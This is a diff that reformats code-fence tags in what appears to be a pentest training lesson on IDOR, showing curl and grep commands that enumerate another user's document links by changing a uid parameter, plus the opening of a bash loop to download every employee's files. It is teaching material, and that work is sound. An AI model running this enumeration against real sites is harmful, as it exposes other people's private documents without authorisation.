@@ -26,8 +26,7 @@ http://SERVER\_IP:PORT/documents.php?uid=1
 
 When we get to the `Documents` page, we see several documents that belong to our user. These can be files uploaded by our user or files set for us by another department (e.g., HR Department). Checking the file links, we see that they have individual names:
 
-```
-        html
+```html
 /documents/Invoice_1_09_2021.pdf
 /documents/Report_1_10_2021.pdf
 ```
@@ -44,8 +43,7 @@ http://SERVER\_IP:PORT/documents.php?uid=2
 
 However, `we must be attentive to the page details during any web pentest` and always keep an eye on the source code and page size. If we look at the linked files, or if we click on them to view them, we will notice that these are indeed different files, which appear to be the documents belonging to the employee with `uid=2`:
 
-```
-        html
+```html
 /documents/Invoice_2_08_2020.pdf
 /documents/Report_2_12_2020.pdf
 ```
@@ -60,16 +58,14 @@ We can try manually accessing other employee documents with `uid=3`, `uid=4`, an
 
 We can click on `CTRL+SHIFT+C` in Firefox to enable the `element inspector`, and then click on any of the links to view their HTML source code, and we will get the following:
 
-```
-        html
+```html
 <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
 <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
 ```
 
 We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
 
 <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
@@ -78,8 +74,7 @@ hiimeins@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "
 
 As we can see, we were able to capture the document links successfully. We may now use specific bash commands to trim the extra parts and only get the document links in the output. However, it is a better practice to use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep` to only get the document links, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "/documents.*?.pdf"
 
 /documents/Invoice_3_06_2020.pdf
@@ -88,8 +83,7 @@ hiimeins@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -
 
 Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:
 
-```
-        bash
+```bash
 #!/bin/bash
 
 url="http://SERVER_IP:PORT"
